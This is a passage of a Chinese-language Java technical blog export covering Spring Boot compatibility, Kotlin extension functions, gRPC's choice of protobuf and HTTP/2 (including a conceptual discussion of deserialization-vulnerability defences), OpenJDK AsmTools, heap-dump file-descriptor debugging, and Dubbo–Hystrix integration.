2下面修改了ManagementContextConfiguration的包名，所以对于Endpoint天然是兼容的，不同的模块自己编绎就可以了。 HealthIndicator的兼容类似Endpoint的处理，spring boot 1/2的代码分别放不同的autoconfigure模块里，然后各自的@Configuration类分别使用@ConditionalOnSpringBoot1/@ConditionalOnSpringBoot2来判断。 通过集成测试保证兼容性还是以endpoints-spring-boot-autoconfigure1模块为例。 这个模块是为spring boot 1准备的，则它的集成测试要配置为spring boot 2。 参考相关的代码：查看 在springboot2demo/pom.xml里依赖spring boot 2 在verify.groovy里检测应用是否启动成功 总结 通过ASM分析现有的starter里不兼容的类 配置注入通过BinderUtils解决 各自的@Configuration类分别用@ConditionalOnSpringBoot1/@ConditionalOnSpringBoot2来判断 代码分模块：commons放公共逻辑, autoconfigure1/autoconfigure2 对应 spring boot 1/2的自动装配，starter给应用依赖 Endpoint的Configuration入口是ManagementContextConfiguration，因为spring boot 2里修改了package，所以直接在spring.factories里配置即可 通过集成测试保证兼容性 如果某一天，不再需要支持spring boot 1了，则直接把autoconfigure1模块去掉即可 链接 https://github.com/hengyunabc/spring-boot-utils https://github.com/hengyunabc/springboot-classchecker https://github.com/hengyunabc/endpoints-spring-boot-starter]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kotlin里的Extension Functions实现原理分析]]></title>
    <url>%2Fkotlin-extension-functions%2F</url>
    <content type="text"><![CDATA[Kotlin里的Extension FunctionsKotlin里有所谓的扩展函数(Extension Functions)，支持给现有的java类增加函数。 https://kotlinlang.org/docs/reference/extensions.html 比如给String增加一个hello函数，可以这样子写： 123456fun String.hello(world : String) : String &#123; return "hello " + world + this.length;&#125;fun main(args: Array&lt;String&gt;) &#123; System.out.println("abc".hello("world"));&#125; 可以看到在main函数里，直接可以在String上调用hello函数。 执行后，输出结果是： 1hello world3 可以看到在hello函数里的this引用的是&quot;abc&quot;。 刚开始看到这个语法还是比较新奇的，那么怎样实现的呢？如果不同的库都增加了同样的函数会不会冲突？ 反编绎生成的字节码，结果是： 1234567@NotNullpublic static final String hello(@NotNull String $receiver, @NotNull String world) &#123; return "hello " + world + $receiver.length();&#125;public static final void main(@NotNull String[] args) &#123; System.out.println(hello("abc", "world"));&#125; 可以看到，实际上是增加了一个static public final函数。 并且新增加的函数是在自己的类里的，并不是在String类里。即不同的库新增加的扩展函数都是自己类里的，不会冲突。 lombok 里的 @ExtensionMethod 实现lombok里也提供了类似的@ExtensionMethod支持。 https://projectlombok.org/features/experimental/ExtensionMethod 和上面的例子一样，给String类增加一个hello函数： 需要定义一个class Extensions 再用@ExtensionMethod声明 1234567891011121314class Extensions &#123; public static String hello(String receiver, String world) &#123; return "hello " + world + receiver.length(); &#125;&#125;@ExtensionMethod(&#123; Extensions.class&#125;)public class Test &#123; public static void main(String[] args) &#123; System.out.println("abc".hello("world")); &#125;&#125; 执行后，输出结果是： 1hello world3 可以看到在hello函数里，第一个参数String receiver就是&quot;abc&quot;本身。 和上面kotlin的例子不一样的是，kotlin里直接可以用this。 生成的字节码反编绎结果是： 12345678910class Extensions &#123; public static String hello(String receiver, String world) &#123; return "hello " + world + receiver.length(); &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; System.out.println(Extensions.hello("abc", "world")); &#125;&#125; 可以看到所谓的@ExtensionMethod实际上也是一个语法糖。 设计动机 https://kotlinlang.org/docs/reference/extensions.html#motivation 据kotlin的文档：各种FileUtils，StringUtils类很麻烦。 比如像下面处理List，在java里可以用java.util.Collections 1234// JavaCollections.swap(list, Collections.binarySearch(list, Collections.max(otherList)), Collections.max(list)); 简化下import，可以变为 12// Javaswap(list, binarySearch(list, max(otherList)), max(list)); 但是还不够清晰，各种import *也是比较烦的。利用扩展函数，可以直接这样子写： 12// Javalist.swap(list.binarySearch(otherList.max()), list.max()); 总结 kotlin的Extension Functions和lombok的@ExtensionMethod实际上都是增加public static final函数 不同的库增加的同样的Extension Functions不会冲突 设计的动机是减少各种utils类。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>asm</tag>
        <tag>bytecode</tag>
        <tag>kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[思考gRPC ：为什么是protobuf]]></title>
    <url>%2Fthinking-about-grpc-protobuf%2F</url>
    <content type="text"><![CDATA[背景谈到RPC，就避免不了序列化的话题。 gRPC默认的序列化方式是protobuf，原因很简单，因为两者都是google发明的，哈哈。 在当初Google开源protobuf时，很多人就期待是否能把RPC的实现也一起开源出来。没想到最终出来的是gRPC，终于补全了这一块。 跨语言的序列化方案事实上的跨语言序列化方案只有三个： protobuf, thrift, json。 json体积太大，并且缺少类型信息，实际上只用在RESTful接口上，并没有看到RPC框架会默认选json做序列化的。 国内一些大公司的使用情况： protobuf ，腾迅，百度等 thrift，小米，美团等 hessian， 阿里用的是自己维护的版本，有js/cpp的实现，因为阿里主用java，更多是历史原因。 序列化里的类型信息序列化就是把对象转换为二进制数据，反序列化就把二进制数据转换为对象。 各种序列化库层出不穷，其中有一个重要的区别：类型信息存放在哪？ 可以分为三种： 不保存类型信息 典型的是各种json序列化库，优点是灵活，缺点是使用的双方都要知道类型是什么。当然有一些json库会提供一些扩展，偷偷把类型信息插入到json里。 类型信息保存到序列化结果里 比如java自带的序列化，hessian等。缺点是类型信息冗余。比如RPC里每一个request都要带上类型。因此有一种常见的RPC优化手段就是两端协商之后，后续的请求不需要再带上类型信息。 在生成代码里带上类型信息 通常是在IDL文件里写好package和类名，生成的代码直接就有了类型信息。比如protobuf, thrift。缺点是需要生成代码，双方都要知道IDL文件。 类型信息看起来是一个小事，但在安全上却会出大问题，后面会讨论。 实际使用中序列化有哪些问题这里讨论的是没有IDL定义的序列化方案，比如java自带的序列化，hessian, 各种json库。 大小莫名增加，比如用户不小心向map里put了大对象。 对象之间互相引用，用户根本不清楚序列化到底会产生什么结果，可能新加一个field就不小心被序列化了 enum类新增加的不能识别，当两端的类版本不一致时就会出错 哪些字段应该跳过序列化 ，不同的库都有不同的 @Ignore ，没有通用的方案 很容易把一些奇怪的类传过来，然后对端报ClassNotFoundException 新版本jdk新增加的类不支持，需要序列化库不断升级，如果没人维护就悲剧了 库本身的代码质量不高，或者API设计不好容易出错，比如kryo gRPC是protobuf的一个插件以gRPC官方的Demo为例： 1234567891011121314151617package helloworld;// The greeting service definition.service Greeter &#123; // Sends a greeting rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;&#125;// The request message containing the user's name.message HelloRequest &#123; string name = 1;&#125;// The response message containing the greetingsmessage HelloReply &#123; string message = 1;&#125; 可以看到rpc的定义也是写在proto文件里的。实际上gRPC是protobuf的一个扩展，通过扩展生成gRPC相关的代码。 protobuf并不是完美解决方案在protobuf出来以后，也不断出现新的方案。比如 https://github.com/capnproto/capnproto https://github.com/google/flatbuffers https://avro.apache.org/ protobuf的一些缺点： 缺少map/set的支持(proto3支持map) Varint编码会消耗CPU 会影响CPU缓存，比如比较大的int32从4字节用Varint表示是5字节就不对齐了 解码时要复制一份内存，不能做原地内存引用的优化 protobuf在google 2008年公开的，内部使用自然更早。当时带宽还比较昂贵，现在人们对速度的关注胜过带宽了。 protobuf需要生成代码的确有点麻烦，所以会有基于java annotation的方案： https://github.com/protostuff/protostuff 同样thrift有： https://github.com/facebookarchive/swift 序列化库的速度问题总有序列化库跳出来说自己速度最快，其实很多时候猫腻很多。事有反常必有妖。 常见的加快速度的手段有： threadlocal的byte array 当序列化一个大对象后，threadlocal的byte array增大，然后不能及时释放。如果线程池越大，则占用的内存会越多。fastjson采用一种动态缩小的处理办法，但不能从根本解决这个问题。 用asm的方式生成代码，避免反射调用getter/setter 这样会导致库代码复杂，容易有bug，并且会占用内存。 循环引用用ID标识对象 kryo要求注册类型的顺序是统一的，因为它要为类型分配ID，然后在处理循环引用时，把同样的对象直接用ID来标识，这样子可以大大减少体积。 但是用户在使用时，调用代码的顺序可能是不确定的，注册上去的ID也可能不一样，那么反序列化就会有问题。 kryo的API还不是线程安全的，很容易踩坑。 在benchmark里protobuf的速度在前列，并不是最快。但是protobuf用生成代码的方式保证了内存占用，时间占用不会出问题。 序列化被人忽视的安全性问题序列化漏洞危害很大 序列化漏洞通常比较严重，容易造成任意代码执行 序列化漏洞在很多语言里都会有，比如Python Pickle序列化漏洞。 很多程序员不理解为什么反序列化可以造成任意代码执行。 反序列化漏洞到底是怎么工作的呢？很难直接描述清楚，这些漏洞都有很精巧的设计，把多个地方的代码串联起来。可以参考这个demo，跑起来调试下就可以有直观的印象： https://github.com/hengyunabc/dubbo-apache-commons-collections-bug 这里有两个生成java序列化漏洞代码的工具： https://github.com/frohoff/ysoserial https://github.com/mbechler/marshalsec 常见的库怎样防止反序列化漏洞下面来看下常见的序列化方案是怎么防止反序列化漏洞的： Java Serialization jdk里增加了一个filter机制 http://openjdk.java.net/jeps/290 ，这个一开始是出现在jdk9上的，后面移值回jdk6/7/8上，如果安装的jdk版本是比较新的，可以找到相关的类 Oracle打算废除java序列化：https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html jackson-databind jackson-databind里是过滤掉一些已知的类，参见SubTypeValidator.java jackson-databind的CVE issue列表 fastjson fastjson通过一个denyList来过滤掉一些危险类的package，参见ParserConfig.java fastjson在新版本里denyList改为通过hashcode来隐藏掉package信息，但通过这个DenyTest5可以知道还是过滤掉常见危险类的package fastjson在新版本里默认把autoType的功能禁止掉了 所以总结下来，要么白名单，要么黑名单。当然黑名单机制不能及时更新，业务方得不断升jar包，非常蛋疼。白名单是比较彻底的解决方案。 为什么protobuf没有序列化漏洞这些序列化漏洞的根本原因是：没有控制序列化的类型范围 为什么在protobuf里并没有这些反序列化问题？ protobuf在IDL里定义好了package范围 protobuf的代码都是自动生成的，怎么处理二进制数据都是固定的 protobuf把一切都框住了，少了灵活性，自然就少漏洞。 总结 应该重视反序列化漏洞，毕竟Oracle都不得不考虑把java序列化废弃了 序列化漏洞的根本原因是：没有控制序列化的类型范围 防止序列化漏洞，最好是使用白名单 protobuf通过IDL生成代码，严格控制了类型范围 protobuf不是完美的方案，但是作为跨语言的序列化事实方案之一，IDL生成代码比较麻烦也不是啥大问题 链接 https://github.com/protostuff/protostuff https://github.com/facebookarchive/swift http://openjdk.java.net/jeps/290 https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>rpc</tag>
        <tag>http2</tag>
        <tag>grpc</tag>
        <tag>protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[思考gRPC ：为什么是HTTP/2]]></title>
    <url>%2Fthinking-about-grpc-http2%2F</url>
    <content type="text"><![CDATA[背景gRPC是google开源的高性能跨语言的RPC方案。gRPC的设计目标是在任何环境下运行，支持可插拔的负载均衡，跟踪，运行状况检查和身份验证。它不仅支持数据中心内部和跨数据中心的服务调用，它也适用于分布式计算的最后一公里，将设备，移动应用程序和浏览器连接到后端服务。 https://grpc.io/ https://github.com/grpc/grpc GRPC设计的动机和原则 https://grpc.io/blog/principles 个人觉得官方的文章令人印象深刻的点： 内部有Stubby的框架，但是它不是基于任何一个标准的 支持任意环境使用，支持物联网、手机、浏览器 支持stream和流控 HTTP/2是什么在正式讨论gRPC为什么选择HTTP/2之前，我们先来简单了解下HTTP/2。 HTTP/2可以简单用一个图片来介绍： 来自：https://hpbn.co/ 可以看到： HTTP/1里的header对应HTTP/2里的 HEADERS frame HTTP/1里的payload对应HTTP/2里的 DATA frame 在Chrome浏览器里，打开chrome://net-internals/#http2，可以看到http2链接的信息。 目前很多网站都已经跑在HTTP/2上了，包括alibaba。 gRPC over HTTP/2准确来说gRPC设计上是分层的，底层支持不同的协议，目前gRPC支持： gRPC over HTTP2 gRPC Web 但是大多数情况下，讨论都是基于gRPC over HTTP2。 下面从一个真实的gRPC SayHello请求，查看它在HTTP/2上是怎样实现的。用wireshark抓包： 可以看到下面这些Header： Header: :authority: localhost:50051 Header: :path: /helloworld.Greeter/SayHello Header: :method: POST Header: :scheme: http Header: content-type: application/grpc Header: user-agent: grpc-java-netty/1.11.0 然后请求的参数在DATA frame里： GRPC Message: /helloworld.Greeter/SayHello, Request 简而言之，gGRPC把元数据放到HTTP/2 Headers里，请求参数序列化之后放到 DATA frame里。 基于HTTP/2 协议的优点HTTP/2 是一个公开的标准Google本身把这个事情想清楚了，它并没有把内部的Stubby开源，而是选择重新做。现在技术越来越开放，私有协议的空间越来越小。 HTTP/2 是一个经过实践检验的标准HTTP/2是先有实践再有标准，这个很重要。很多不成功的标准都是先有一大堆厂商讨论出标准后有实现，导致混乱而不可用，比如CORBA。HTTP/2的前身是Google的SPDY，没有Google的实践和推动，可能都不会有HTTP/2。 HTTP/2 天然支持物联网、手机、浏览器实际上先用上HTTP/2的也是手机和手机浏览器。移动互联网推动了HTTP/2的发展和普及。 基于HTTP/2 多语言客户端实现容易只讨论协议本身的实现，不考虑序列化。 每个流行的编程语言都会有成熟的HTTP/2 Client HTTP/2 Client是经过充分测试，可靠的 用Client发送HTTP/2请求的难度远低于用socket发送数据包/解析数据包 HTTP/2支持Stream和流控在业界，有很多支持stream的方案，比如基于websocket的，或者rsocket。但是这些方案都不是通用的。 HTTP/2里的Stream还可以设置优先级，尽管在rpc里可能用的比较少，但是一些复杂的场景可能会用到。 基于HTTP/2 在Gateway/Proxy很容易支持 nginx对gRPC的支持：https://www.nginx.com/blog/nginx-1-13-10-grpc/ envoy对gRPC的支持：https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/grpc# HTTP/2 安全性有保证 HTTP/2 天然支持SSL，当然gRPC可以跑在clear text协议（即不加密）上。 很多私有协议的rpc可能自己包装了一层TLS支持，使用起来也非常复杂。开发者是否有足够的安全知识？使用者是否配置对了？运维者是否能正确理解？ HTTP/2 在公有网络上的传输上有保证。比如这个CRIME攻击，私有协议很难保证没有这样子的漏洞。 HTTP/2 鉴权成熟 从HTTP/1发展起来的鉴权系统已经很成熟了，可以无缝用在HTTP/2上 可以从前端到后端完全打通的鉴权，不需要做任何转换适配 比如传统的rpc dubbo，需要写一个dubbo filter，还要考虑把鉴权相关的信息通过thread local传递进去。rpc协议本身也需要支持。总之，非常复杂。实际上绝大部分公司里的rpc都是没有鉴权的，可以随便调。 基于HTTP/2 的缺点 rpc的元数据的传输不够高效 尽管HPAC可以压缩HTTP Header，但是对于rpc来说，确定一个函数调用，可以简化为一个int，只要两端去协商过一次，后面直接查表就可以了，不需要像HPAC那样编码解码。 可以考虑专门对gRPC做一个优化过的HTTP/2解析器，减少一些通用的处理，感觉可以提升性能。 HTTP/2 里一次gRPC调用需要解码两次 一次是HEADERS frame，一次是DATA frame。 HTTP/2 标准本身是只有一个TCP连接，但是实际在gRPC里是会有多个TCP连接，使用时需要注意。 gRPC选择基于HTTP/2，那么它的性能肯定不会是最顶尖的。但是对于rpc来说中庸的qps可以接受，通用和兼容性才是最重要的事情。 官方的benchmark：https://grpc.io/docs/guides/benchmarking.html https://github.com/hank-whu/rpc-benchmark Google制定标准的能力近10年来，Google制定标准的能力越来越强。下面列举一些标准： HTTP/2 WebP图片格式 WebRTC 网页即时通信 VP9/AV1 视频编码标准 Service Worker/PWA 当然google也并不都会成功，很多事情它想推也失败了，比如Chrome的Native Client。 gRPC目前是k8s生态里的事实标准。 gRPC是否会成为更多地方，更大领域的RPC标准？ 为什么会出现gRPC准确来说为什么会出现基于HTTP/2的RPC？ 个人认为一个重要的原因是，在Cloud Native的潮流下，开放互通的需求必然会产生基于HTTP/2的RPC。即使没有gRPC，也会有其它基于HTTP/2的RPC。 gRPC在Google的内部也是先用在Google Cloud Platform和公开的API上：https://opensource.google.com/projects/grpc 尽管gRPC它可能替换不了内部的RPC实现，但是在开放互通的时代，不止在k8s上，gRPC会有越来越多的舞台可以施展。 链接 https://hpbn.co/ https://grpc.io/blog/loadbalancing https://http2.github.io/faq]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>rpc</tag>
        <tag>http2</tag>
        <tag>grpc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenJDK里的AsmTools简介]]></title>
    <url>%2Fopenjdk-asmtools%2F</url>
    <content type="text"><![CDATA[前言 https://wiki.openjdk.java.net/display/CodeTools/asmtools 在OpenJDK里有一个AsmTools项目，用来生成正确的或者不正确的java .class文件，主要用来测试和验证。 我们知道直接修改.class文件是很麻烦的，虽然有一些图形界面的工具，但还是很麻烦。 以前我的办法是用ASMifier从.class文件生成asm java代码，再修改代码，生成新的.class文件，非常麻烦。 AsmTools引入了两种表示.class文件的语法： JASM 用类似java本身的语法来定义类和函数，字节码指令则很像传统的汇编。 JCOD 整个.class用容器的方式来表示，可以很清楚表示类文件的结构。 重要的是两种语法的文件都是可以和.class互相转换的。 构建AsmTools官方文档： https://wiki.openjdk.java.net/display/CodeTools/How+to+build+AsmTools 需要有jdk8和ant。 clone代码 1hg clone http://hg.openjdk.java.net/code-tools/asmtools 编绎 12cd asmtools/buildant 打包出来的zip包里有一个asmtools.jar。 也可以在这里下载我构建的：https://github.com/hengyunabc/hengyunabc.github.io/files/2188258/asmtools-7.0.zip 测试简单的java类12345public class Test &#123; public static void main(String[] args) &#123; System.out.println("hello"); &#125;&#125; 先用javac来编绎： 1javac Test.java 查看JASM语法结果1java -jar asmtools.jar jdis Test.class 结果： 12345678910111213141516171819202122232425super public class Test version 52:0&#123;public Method &quot;&lt;init&gt;&quot;:&quot;()V&quot; stack 1 locals 1&#123; aload_0; invokespecial Method java/lang/Object.&quot;&lt;init&gt;&quot;:&quot;()V&quot;; return;&#125;public static Method main:&quot;([Ljava/lang/String;)V&quot; stack 2 locals 1&#123; getstatic Field java/lang/System.out:&quot;Ljava/io/PrintStream;&quot;; ldc String &quot;hello&quot;; invokevirtual Method java/io/PrintStream.println:&quot;(Ljava/lang/String;)V&quot;; return;&#125;&#125; // end Class Test 查看JCOD语法结果1java -jar asmtools.jar jdec Test.class 结果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121class Test &#123; 0xCAFEBABE; 0; // minor version 52; // version [] &#123; // Constant Pool ; // first element is empty class #2; // #1 Utf8 &quot;Test&quot;; // #2 class #4; // #3 Utf8 &quot;java/lang/Object&quot;; // #4 Utf8 &quot;&lt;init&gt;&quot;; // #5 Utf8 &quot;()V&quot;; // #6 Utf8 &quot;Code&quot;; // #7 Method #3 #9; // #8 NameAndType #5 #6; // #9 Utf8 &quot;LineNumberTable&quot;; // #10 Utf8 &quot;LocalVariableTable&quot;; // #11 Utf8 &quot;this&quot;; // #12 Utf8 &quot;LTest;&quot;; // #13 Utf8 &quot;main&quot;; // #14 Utf8 &quot;([Ljava/lang/String;)V&quot;; // #15 Field #17 #19; // #16 class #18; // #17 Utf8 &quot;java/lang/System&quot;; // #18 NameAndType #20 #21; // #19 Utf8 &quot;out&quot;; // #20 Utf8 &quot;Ljava/io/PrintStream;&quot;; // #21 String #23; // #22 Utf8 &quot;hello&quot;; // #23 Method #25 #27; // #24 class #26; // #25 Utf8 &quot;java/io/PrintStream&quot;; // #26 NameAndType #28 #29; // #27 Utf8 &quot;println&quot;; // #28 Utf8 &quot;(Ljava/lang/String;)V&quot;; // #29 Utf8 &quot;args&quot;; // #30 Utf8 &quot;[Ljava/lang/String;&quot;; // #31 Utf8 &quot;SourceFile&quot;; // #32 Utf8 &quot;Test.java&quot;; // #33 &#125; // Constant Pool 0x0021; // access #1;// this_cpx #3;// super_cpx [] &#123; // Interfaces &#125; // Interfaces [] &#123; // fields &#125; // fields [] &#123; // methods &#123; // Member 0x0001; // access #5; // name_cpx #6; // sig_cpx [] &#123; // Attributes Attr(#7) &#123; // Code 1; // max_stack 1; // max_locals Bytes[]&#123; 0x2AB70008B1; &#125; [] &#123; // Traps &#125; // end Traps [] &#123; // Attributes Attr(#10) &#123; // LineNumberTable [] &#123; // LineNumberTable 0 2; &#125; &#125; // end LineNumberTable ; Attr(#11) &#123; // LocalVariableTable [] &#123; // LocalVariableTable 0 5 12 13 0; &#125; &#125; // end LocalVariableTable &#125; // Attributes &#125; // end Code &#125; // Attributes &#125; // Member ; &#123; // Member 0x0009; // access #14; // name_cpx #15; // sig_cpx [] &#123; // Attributes Attr(#7) &#123; // Code 2; // max_stack 1; // max_locals Bytes[]&#123; 0xB200101216B60018; 0xB1; &#125; [] &#123; // Traps &#125; // end Traps [] &#123; // Attributes Attr(#10) &#123; // LineNumberTable [] &#123; // LineNumberTable 0 5; 8 6; &#125; &#125; // end LineNumberTable ; Attr(#11) &#123; // LocalVariableTable [] &#123; // LocalVariableTable 0 9 30 31 0; &#125; &#125; // end LocalVariableTable &#125; // Attributes &#125; // end Code &#125; // Attributes &#125; // Member &#125; // methods [] &#123; // Attributes Attr(#32) &#123; // SourceFile #33; &#125; // end SourceFile &#125; // Attributes&#125; // end class Test 从JASM/JCOD语法文件生成类文件因为是等价表达，可以从JASM生成.class文件： 1java -jar asmtools.jar jasm Test.jasm 同样可以从JCOD生成.class文件： 1java -jar asmtools.jar jcoder Test.jasm 更多使用方法参考： https://wiki.openjdk.java.net/display/CodeTools/Chapter+2#Chapter2-Jasm.1 链接 https://wiki.openjdk.java.net/display/CodeTools/Appendix+A JASM Syntax https://wiki.openjdk.java.net/display/CodeTools/Appendix+B JCOD Syntax]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从JVM heap dump里查找没有关闭文件的引用]]></title>
    <url>%2Fjvm-heap-dump-find-fd%2F</url>
    <content type="text"><![CDATA[背景最近排查一个文件没有关闭的问题，记录一下。 哪些文件没有关闭是比较容易找到的，查看进程的fd(File Descriptor)就可以。但是确定fd是在哪里被打开，在哪里被引用的就复杂点，特别是在没有重启应用的情况下。在JVM里可以通过heap dump比较方便地反查对象的引用，从而找到泄露的代码。 以下面简单的demo为例，Demo会创建一个临时文件，并且没有close掉： 1234567891011import java.io.File;import java.io.FileInputStream;import java.io.IOException;public class Test &#123; public static void main(String[] args) throws IOException &#123; File tempFile = File.createTempFile("test", "ttt"); FileInputStream fi = new FileInputStream(tempFile); System.in.read(); &#125;&#125; 通过文件名查找对应的fd进程打开的文件在OS里有对应的fd(File Descriptor)，可以用lsof命令或者直接在linux下到/proc目录下查看。 以demo为例，可以找到test文件的fd是12： 12345678$ ls -alh /proc/11278/fd/total 0dr-x------ 2 admin users 0 Jun 30 18:20 .dr-xr-xr-x 8 admin users 0 Jun 30 18:20 ..lrwx------ 1 admin users 64 Jun 30 18:20 0 -&gt; /dev/pts/0lrwx------ 1 admin users 64 Jun 30 18:20 1 -&gt; /dev/pts/0lr-x------ 1 admin users 64 Jun 30 18:24 11 -&gt; /dev/urandomlr-x------ 1 admin users 64 Jun 30 18:24 12 -&gt; /tmp/test7607712940880692142ttt 对进程进行heap dump使用jmap命令： 1jmap -dump:live,format=b,file=heap.bin 11278 通过OQL查询java.io.FileDescriptor对象对于每一个打开的文件在JVM里都有一个java.io.FileDescriptor对象。查看下源码，可以发现FileDescriptor里有一个fd字段： 12public final class FileDescriptor &#123; private int fd; 所以需要查找到fd等于12的FileDescriptor，QOL语句： 1select s from java.io.FileDescriptor s where s.fd == 12 使用VisualVM里的OQL控制台查询在jdk8里自带VisualVM，jdk9之后可以单独下载：https://visualvm.github.io/ 把heap dump文件导入VisualVM里，然后在“OQL控制台”查询上面的语句，结果是： 再可以查询到parent，引用相关的对象。 使用jhat查询除了VisualVM还有其它很多heap dump工具，在jdk里还自带一个jhat工具，尽管在jdk9之后移除掉了，但是个人还是比较喜欢这个工具，因为它是一个web接口的。 1jhat -port 7000 heap.bin 访问 http://localhost:7000/oql/ ，可以在浏览器里查询OQL： 打开链接可以查看具体的信息 总结 先找出没有关闭文件的fd 从heap dump里据fd找出对应的java.io.FileDescriptor对象，再找到相关引用 链接 ViauslVM Object Query Language (OQL)]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>fd</tag>
        <tag>visualvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：快速集成Dubbo + Hystrix]]></title>
    <url>%2Fspring-boot-dubbo-hystrix%2F</url>
    <content type="text"><![CDATA[背景Hystrix 旨在通过控制那些访问远程系统、服务和第三方库的节点，从而对延迟和故障提供更强大的容错能力。Hystrix具备拥有回退机制和断路器功能的线程和信号隔离，请求缓存和请求打包，以及监控和配置等功能。 Dubbo是Alibaba开源的，目前国内最流行的java rpc框架。 本文介绍在spring应用里，怎么把Dubbo和Hystrix结合起来使用。 https://github.com/Netflix/Hystrix https://github.com/apache/incubator-dubbo Spring Boot应用Demo地址： https://github.com/dubbo/dubbo-samples/tree/master/dubbo-samples-spring-boot-hystrix 生成dubbo集成spring boot的应用对于不熟悉dubbo 集成spring boot应用的同学，可以在这里直接生成dubbo + spring boot的工程： http://start.dubbo.io/ 配置spring-cloud-starter-netflix-hystrixspring boot官方提供了对hystrix的集成，直接在pom.xml里加入依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;version&gt;1.4.4.RELEASE&lt;/version&gt;&lt;/dependency&gt; 然后在Application类上增加@EnableHystrix来启用hystrix starter： 123@SpringBootApplication@EnableHystrixpublic class ProviderApplication &#123; 配置Provider端在Dubbo的Provider上增加@HystrixCommand配置，这样子调用就会经过Hystrix代理。 123456789101112@Service(version = "1.0.0")public class HelloServiceImpl implements HelloService &#123; @HystrixCommand(commandProperties = &#123; @HystrixProperty(name = "circuitBreaker.requestVolumeThreshold", value = "10"), @HystrixProperty(name = "execution.isolation.thread.timeoutInMilliseconds", value = "2000") &#125;) @Override public String sayHello(String name) &#123; // System.out.println("async provider received: " + name); // return "annotation: hello, " + name; throw new RuntimeException("Exception to show hystrix enabled."); &#125;&#125; 配置Consumer端对于Consumer端，则可以增加一层method调用，并在method上配置@HystrixCommand。当调用出错时，会走到fallbackMethod = &quot;reliable&quot;的调用里。 12345678910@Reference(version = "1.0.0")private HelloService demoService;@HystrixCommand(fallbackMethod = "reliable")public String doSayHello(String name) &#123; return demoService.sayHello(name);&#125;public String reliable(String name) &#123; return "hystrix fallback value";&#125; 通过上面的配置，很简单地就完成了Spring Boot里Dubbo + Hystrix的集成。 传统Spring Annotation应用Demo地址： https://github.com/dubbo/dubbo-samples/tree/master/dubbo-samples-spring-hystrix 传统spring annotation应用的配置其实也很简单，和spring boot应用不同的是： 显式配置Spring AOP支持：@EnableAspectJAutoProxy 显式通过@Configuration配置HystrixCommandAspect Bean。 123456789101112@Configuration@EnableDubbo(scanBasePackages = "com.alibaba.dubbo.samples.annotation.action")@PropertySource("classpath:/spring/dubbo-consumer.properties")@ComponentScan(value = &#123;"com.alibaba.dubbo.samples.annotation.action"&#125;)@EnableAspectJAutoProxystatic public class ConsumerConfiguration &#123; @Bean public HystrixCommandAspect hystrixCommandAspect() &#123; return new HystrixCommandAspect(); &#125;&#125; Hystrix集成Spring AOP原理在上面的例子里可以看到，Hystrix对Spring的集成是通过Spring AOP来实现的。下面简单分析下实现。 12345678910111213141516171819202122232425262728293031323334353637@Aspectpublic class HystrixCommandAspect &#123; @Pointcut("@annotation(com.netflix.hystrix.contrib.javanica.annotation.HystrixCommand)") public void hystrixCommandAnnotationPointcut() &#123; &#125; @Pointcut("@annotation(com.netflix.hystrix.contrib.javanica.annotation.HystrixCollapser)") public void hystrixCollapserAnnotationPointcut() &#123; &#125; @Around("hystrixCommandAnnotationPointcut() || hystrixCollapserAnnotationPointcut()") public Object methodsAnnotatedWithHystrixCommand(final ProceedingJoinPoint joinPoint) throws Throwable &#123; Method method = getMethodFromTarget(joinPoint); Validate.notNull(method, "failed to get method from joinPoint: %s", joinPoint); if (method.isAnnotationPresent(HystrixCommand.class) &amp;&amp; method.isAnnotationPresent(HystrixCollapser.class)) &#123; throw new IllegalStateException("method cannot be annotated with HystrixCommand and HystrixCollapser " + "annotations at the same time"); &#125; MetaHolderFactory metaHolderFactory = META_HOLDER_FACTORY_MAP.get(HystrixPointcutType.of(method)); MetaHolder metaHolder = metaHolderFactory.create(joinPoint); HystrixInvokable invokable = HystrixCommandFactory.getInstance().create(metaHolder); ExecutionType executionType = metaHolder.isCollapserAnnotationPresent() ? metaHolder.getCollapserExecutionType() : metaHolder.getExecutionType(); Object result; try &#123; if (!metaHolder.isObservable()) &#123; result = CommandExecutor.execute(invokable, executionType, metaHolder); &#125; else &#123; result = executeObservable(invokable, executionType, metaHolder); &#125; &#125; catch (HystrixBadRequestException e) &#123; throw e.getCause() != null ? e.getCause() : e; &#125; catch (HystrixRuntimeException e) &#123; throw hystrixRuntimeExceptionToThrowable(metaHolder, e); &#125; return result; &#125; HystrixCommandAspect里定义了两个注解的AspectJ Pointcut：@HystrixCommand, @HystrixCollapser。所有带这两个注解的spring bean都会经过AOP处理 在@Around AOP处理函数里，可以看到Hystrix会创建出HystrixInvokable，再通过CommandExecutor来执行 spring-cloud-starter-netflix-hystrix的代码分析 @EnableHystrix 引入了@EnableCircuitBreaker，@EnableCircuitBreaker引入了EnableCircuitBreakerImportSelector 1234567@EnableCircuitBreakerpublic @interface EnableHystrix &#123;&#125;@Import(EnableCircuitBreakerImportSelector.class)public @interface 